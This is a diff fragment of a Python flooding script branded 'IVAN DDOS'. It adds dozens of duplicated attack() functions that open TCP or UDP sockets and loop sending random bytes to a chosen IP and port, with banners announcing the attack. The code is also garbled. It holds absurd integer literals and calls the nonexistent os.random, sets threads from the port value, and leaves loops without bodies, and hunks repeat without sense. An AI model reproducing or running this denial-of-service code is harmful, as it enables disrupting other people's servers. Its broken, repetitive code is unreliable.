+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+ 
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<------")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(6161, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
+
+        sock.sendto(threads, (ip, port))
+
+    print('\033[91m Tamat')
+    os.system("clear")
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+    
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -7714,7 +7714,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -7740,33 +7740,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -7792,7 +7766,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -7923,7 +7923,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -7949,33 +7949,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8001,7 +7975,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8132,7 +8132,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8158,33 +8158,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8210,7 +8184,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8341,7 +8341,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8367,33 +8367,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8419,7 +8393,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8445,7 +8445,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8471,33 +8471,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8523,7 +8497,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8549,7 +8549,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8575,33 +8575,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8627,7 +8601,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8653,7 +8653,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8679,33 +8679,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8731,7 +8705,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8757,7 +8757,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8783,33 +8783,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8835,7 +8809,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -8896,7 +8896,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8922,33 +8922,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -8974,7 +8948,33 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    
+    while True:
+        port = port or os.random.randint(1, 999999999)
+        threads = threads or os.random.randint(1, 999999999)
+        time = time or os.random.randint(1, 999999999)
+        
+def attack(ip, port, time, threads):
+
+    if time is None:
+        time = float('inf')
+
+    if port is not None:
+        port = max(1, min(999999999, port))
+    if threads is not None:
+        threads = max(1, min(999999999, port))
+    print(brand)
+    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
+    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports'
+    )
+    print(fmt)
+
+    startup = tt()
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     
     while True:
@@ -9105,7 +9105,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
@@ -9131,33 +9131,7 @@ def attack(ip, port, time, threads):
     print(fmt)
 
     startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    
-    while True:
-        port = port or os.random.randint(1, 999999999)
-        threads = threads or os.random.randint(1, 999999999)
-        time = time or os.random.randint(1, 999999999)
-        
-def attack(ip, port, time, threads):
-
-    if time is None:
-        time = float('inf')
-
-    if port is not None:
-        port = max(1, min(999999999, port))
-    if threads is not None:
-        threads = max(1, min(999999999, port))
-    print(brand)
-    print("\033[92m ---->>>> SENT PACKET IVAN DDOS <<<<-----")
-    fmt = '\033[91m  Sending Attack To ===> Ip {ip}, Port {port}'.format(
-        ip=ip,
-        port='port {port}'.format(port=port) if port else 'random ports'
-    )
-    print(fmt)
-
-    startup = tt()
-    threads = os.urandom(min(11111000000000999999999567890556677889955555555566666666667777777778888888888999999999, threads))
+    threads = os.urandom(min(111110000000009999999995678900000000099999999955555555566666666667777777778888888888999999999, threads))
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     
     while True:
